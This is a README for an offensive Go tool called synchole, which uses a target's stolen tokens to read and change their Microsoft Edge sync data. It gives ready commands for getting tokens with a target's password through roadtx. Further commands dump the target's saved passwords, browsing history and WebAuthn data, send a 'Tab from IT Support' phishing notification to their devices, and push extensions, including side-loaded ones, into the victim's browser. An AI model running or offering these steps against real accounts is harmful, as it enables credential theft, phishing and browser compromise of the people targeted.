# synchole

Standalone Edge Sync enumeration and write tool. Reads, writes, and deletes sync entities from a target's Microsoft Edge sync store using pre-obtained access tokens.

## Building

```bash
go build -o synchole .
```

## Required Tokens

synchole requires two access tokens:

| Token | Flag | Description |
|---|---|---|
| Edge Sync Token | `--msedgetoken` / `-s` | Access token for `edge.microsoft.com` (the sync service) |
| AAD RMS Token | `--aadrmstoken` / `-r` | Access token for `api.aadrm.com` (decrypts the publishing license to obtain the derivation key) |

If you already have the derivation key you can skip the AAD RMS token and pass `--newkey` / `-k` instead.

### Obtaining tokens with roadtx

Use [roadtx](https://github.com/dirkjanm/ROADtools) to acquire the two tokens. Both use the Edge client ID (`d7b530a4-7680-4c23-a8bf-c52c121d2e87`).

**Edge Sync Token** (resource: `https://edge.microsoft.com`):

```bash
roadtx gettokens \
  --client d7b530a4-7680-4c23-a8bf-c52c121d2e87 \
  --resource https://edge.microsoft.com \
  -u user@target.com \
  -p 'password'

# The access_token from the response is your --msedgetoken value
export EDGE_TOKEN="eyJ0eX..."
```

**AAD RMS Token** (resource: `https://api.aadrm.com`):

```bash
roadtx gettokens \
  --client d7b530a4-7680-4c23-a8bf-c52c121d2e87 \
  --resource https://api.aadrm.com \
  -u user@target.com \
  -p 'password'

# The access_token from the response is your --aadrmstoken value
export RMS_TOKEN="eyJ0eX..."
```

If you have a refresh token or PRT instead of credentials, substitute the appropriate roadtx auth method (e.g. `roadtx gettokens --refresh-token <RT> ...`).

## Usage Examples

### Enum: Dump passwords, devices, and history

```bash
./synchole enum \
  -s "$EDGE_TOKEN" \
  -r "$RMS_TOKEN" \
  --useful
```

`--useful` is a shorthand that requests passwords, device info, and browsing history in one shot.

### Enum: Dump a specific data type by flag

```bash
./synchole enum \
  -s "$EDGE_TOKEN" \
  -r "$RMS_TOKEN" \
  --password --extension --webauthn
```

You can combine any of the type flags: `--password`, `--extension`, `--history`, `--device`, `--preference`, `--webauthn`, `--session`, `--sendtab`, `--autofill`, `--autofillprofile`, `--nigori`, `--edrop`, `--savedtabgroup`, `--userconsent`, `--historydelete`, `--deviceinfo`. Use `--everything` to request every known data type, or `--code <int>` for a raw type id.

### Write: Send a tab to a target device

First enumerate devices to find the target's cache GUID:

```bash
./synchole enum -s "$EDGE_TOKEN" -r "$RMS_TOKEN" --device
# Look for: CacheGUID: abc123DEF456...
```

Then send a tab:

```bash
./synchole sendtab \
  -s "$EDGE_TOKEN" \
  -r "$RMS_TOKEN" \
  --title "Important Document" \
  --url "https://example.com/doc" \
  --target-guid "abc123DEF456..." \
  --from-device "IT Support"
```

The target device will receive a "Tab from IT Support" notification opening the URL.

### Write: Push an extension to the target's browser

```bash
./synchole extension \
  -s "$EDGE_TOKEN" \
  -r "$RMS_TOKEN" \
  --extensionid "ghbmnnjooekpmoecnnnilnnbdlolhkhi" \
  --extensionversion "1.72.0" \
  --incognito
```

This syncs an extension entry. On next sync the target's Edge will pick up the extension. Use `--remoteinstall` to mark it as a remote-install. The `--updateurl` defaults to the Edge web store CRX endpoint; override it for side-loaded extensions.

### Delete: Remove a sync entry

Delete requires the entry's client tag hash, ID, and version, all of which are printed during enum (with `--debug` for full detail):

```bash
./synchole enum -s "$EDGE_TOKEN" -r "$RMS_TOKEN" --extension --debug
# Look for: Entry Information (ID: <id> CTH: <cth> VERSION: <version>)
```

Then delete:

```bash
./synchole delete \
  -s "$EDGE_TOKEN" \
  -k "$DERIVATION_KEY" \
  --clienttaghash "vPDikqhQynAI+7CGw+XmgO2FaOY=" \
  --id "0b3b8557-18ea-4ae9-aea2-e1dea6829f69" \
  --version "1772188306858"
```

Note: for delete you can use `--newkey` / `-k` with a previously obtained derivation key instead of passing the AAD RMS token again.

## Flags Reference

### Global flags (available on all subcommands)

| Flag | Short | Description |
|---|---|---|
| `--msedgetoken` | `-s` | Edge Sync access token |
| `--aadrmstoken` | `-r` | AAD RMS access token |
| `--newkey` | `-k` | Pre-obtained derivation key (skips RMS call) |
| `--debug` | | Verbose protobuf and request output |
| `--silent` | | Suppress raw secret material from output |

### Subcommands

| Command | Description |
|---|---|
| `enum` | Read/enumerate sync data |
| `extension` | Write an extension sync entry |
| `settings` | Write an extension settings key/value pair |
| `bookmark` | Write a bookmark entry |
| `sendtab` | Push a Send-Tab-To-Self notification |
| `delete` | Delete a sync entry by ID/CTH/version |
